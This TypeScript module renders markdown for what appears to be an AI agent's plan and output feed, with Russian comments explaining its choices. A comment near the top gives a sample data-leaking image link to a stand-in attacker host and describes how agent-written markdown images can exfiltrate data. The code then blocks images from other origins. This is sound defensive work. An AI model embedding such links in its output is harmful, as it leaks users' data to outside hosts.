import MarkdownIt from 'markdown-it'

// Единственный экземпляр markdown-it на модуль (конфигурация дословно из app.js).
const md = new MarkdownIt({ html: false, linkify: true })

// Внешние ссылки открываются в новой вкладке (decorateLinks в app.js) — через
// переопределение рендерера, чтобы работало с dangerouslySetInnerHTML без DOM-доступа.
const renderLinkOpen =
  md.renderer.rules.link_open ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  if (token === undefined) {
    return renderLinkOpen(tokens, idx, options, env, self)
  }

  if (token.attrIndex('target') < 0) {
    token.attrPush(['target', '_blank'])
    token.attrPush(['rel', 'noopener'])
  }

  return renderLinkOpen(tokens, idx, options, env, self)
}

// Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий
// канал эксфильтрации из текста агента: браузер тянет внешний URL при рендере.
// Экземпляр md общий для плана и ленты — обоим внешние картинки не нужны, поэтому
// правим общий рендерер. Разрешаем ЛЮБУЮ same-origin относительную ссылку
// (`/abs`, `./rel`, `rel/path`, `../x`) — такие рендерились и раньше; глушим
// только то, что делает запрос на ЧУЖОЙ origin: явную схему (`http:`, `https:`,
// `data:`, `javascript:` …) и protocol-relative `//host`. Внешнее заменяется
// экранированным alt-текстом, без <img>.
const renderImage =
  md.renderer.rules.image ??
  ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))

// isSameOriginImageSrc — true для относительных/абсолютно-путевых ссылок того же
// origin; false для protocol-relative (`//host`) и любой явной схемы (`scheme:`).
function isSameOriginImageSrc(src: string): boolean {
  if (src === '' || src.startsWith('//')) return false
  // Явная схема вида `http:`, `data:`, `javascript:` — RFC3986 scheme-префикс.
  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(src)) return false
  return true
}

md.renderer.rules.image = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  const src = token?.attrGet('src') ?? ''
  if (!isSameOriginImageSrc(src)) {
    return escapeHtml(token?.content ?? '')
  }
  return renderImage(tokens, idx, options, env, self)
}

export type SpecialSection = {
  css: string
  icon: string
  label: string
}

const SPECIAL_SECTIONS: Record<string, SpecialSection> = {
  '## Assumptions': { css: 'plan-section-assumptions', icon: '⚠', label: 'Assumptions' },
  '## Acceptance Criteria': { css: 'plan-section-criteria', icon: '✓', label: 'Acceptance Criteria' },
}

// Блочный рендер markdown: спецсекции (## Assumptions / ## Acceptance Criteria) в
// сворачиваемых обёртках + чекбоксы. Соответствует renderMarkdownHTML + decorate
// в текущем app.js.
export function renderMarkdown(text: string): string {
  if (text.trim() === '') return ''

  return decorateCheckboxes(splitAndRender(text))
}

// Нейтральный блочный рендер markdown БЕЗ plan-специфики: не сворачивает спец-секции
// (## Assumptions / ## Acceptance Criteria) и НЕ применяет decorateCheckboxes (та бьёт
// по `[x]`/`[ ]` даже внутри `<code>`). Тот же настроенный экземпляр md (html:false —
// без XSS, linkify, ссылки target=_blank). Для потребителей вне плана — например ленты,
// где текст агента может содержать любой markdown, а plan-обёртки только мешают.
export function renderPlainMarkdown(text: string): string {
  if (text.trim() === '') return ''
  return md.render(text)
}

// Инлайн-рендер одной строки для review-режима (inlineFormat в app.js).
export function renderInline(text: string): string {
  return decorateCheckboxes(md.renderInline(text))
}

// Форматирование одной строки плана в review-режиме (formatLine в app.js).
export function formatLine(line: string): string {
  if (line.startsWith('### ')) return `<h3>${renderInline(line.slice(4))}</h3>`
  if (line.startsWith('## ')) return `<h2>${renderInline(line.slice(3))}</h2>`
  if (line.startsWith('# ')) return `<h1>${renderInline(line.slice(2))}</h1>`

  if (/^[-*]\s+/.test(line)) {
    return `<li>${renderInline(line.replace(/^[-*]\s+/, ''))}</li>`
  }

  if (line.trim() === '') return '&nbsp;'

  return `<p>${renderInline(line)}</p>`
}

export function escapeHtml(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// Единица блочного (комментируемого) рендера: один markdown-блок верхнего уровня
// (параграф, список, blockquote, fenced-код, таблица, заголовок), отрендеренный
// ЦЕЛИКОМ и заякоренный на своей ПЕРВОЙ исходной строке. Номер строки сохраняется,
// поэтому клик-по-строке и цитирование в feedback продолжают работать. Блоки нужны,
// чтобы списки/цитаты/многострочные параграфы не разваливались построчно —
// построчное сканирование не умеет CommonMark (lazy continuation, loose-списки,
// "2." посреди параграфа — не начало списка, а "-" после параграфа — начало).
export type LineBlock = { line: number; html: string }

// Полный блочный рендер фрагмента через markdown-it — в отличие от formatLine,
// который форматирует одну строку инлайн.
function renderBlock(text: string): string {
  return decorateCheckboxes(md.render(text))
}

// Сегментирует текст на markdown-блоки верхнего уровня через token.map из
// markdown-it: парсим весь текст один раз, берём только блок-открывающие токены
// уровня 0 c непустым `map` (paragraph_open/heading_open/bullet_list_open/
// ordered_list_open/blockquote_open/fence/table_open — у закрывающих и у
// вложенных токенов `map` не задан или level > 0), рендерим срез исходных строк
// по границам `map` целиком. level === 0 гарантирует, что вложенные конструкции
// (элементы списка, параграф внутри blockquote, вложенный список) не рендерятся
// повторно — они уже часть среза родительского блока.
export function blockSpans(text: string): LineBlock[] {
  const lines = text.split('\n')
  const tokens = md.parse(text, {})
  const blocks: LineBlock[] = []

  for (const token of tokens) {
    if (token.level !== 0 || token.map === null) continue
    const [start, end] = token.map
    const slice = lines.slice(start, end).join('\n')
    blocks.push({ line: start + 1, html: renderBlock(slice) })
  }

  return blocks
}

// Разбивает текст на блоки для построчного (per-line) UI: pending-вопрос диалога
// и review-план. Общая основа для обоих потребителей.
export function parseLineBlocks(text: string): LineBlock[] {
  return blockSpans(text)
}

export function isSpecialSection(line: string): SpecialSection | null {
  return SPECIAL_SECTIONS[line.trim()] ?? null
}

export function isHeading2(line: string): boolean {
  return line.trim().startsWith('## ')
}

function splitAndRender(text: string): string {
  const lines = text.split('\n')

  const out: string[] = []
  let buffer: string[] = []
  let inSection = false
  let inCode = false

  const flush = () => {
    if (buffer.length > 0) {
      out.push(md.render(buffer.join('\n')))
      buffer = []
    }
  }

  for (const line of lines) {
    if (line.trim().startsWith('```')) {
      inCode = !inCode
      buffer.push(line)
      continue
    }

    if (inCode) {
      buffer.push(line)
      continue
    }

    const section = SPECIAL_SECTIONS[line.trim()]
    if (section !== undefined) {
      flush()
      if (inSection) out.push('</div></div>')
      out.push(
        `<div class="plan-section-wrapper ${section.css}">` +
          `<h2 class="section-header">${section.icon} ${section.label}</h2>` +
          `<div class="plan-section-body">`,
      )
      inSection = true
      continue
    }

    if (inSection && isHeading2(line)) {
      flush()
      out.push('</div></div>')
      inSection = false
    }

    buffer.push(line)
  }

  flush()
  if (inSection) out.push('</div></div>')

  return out.join('')
}

function decorateCheckboxes(html: string): string {
  return html
    .replace(/\[x\]/g, '<span class="cb cb-done">&#10003;</span>')
    .replace(/\[ \]/g, '<span class="cb cb-open">&#9744;</span>')
}
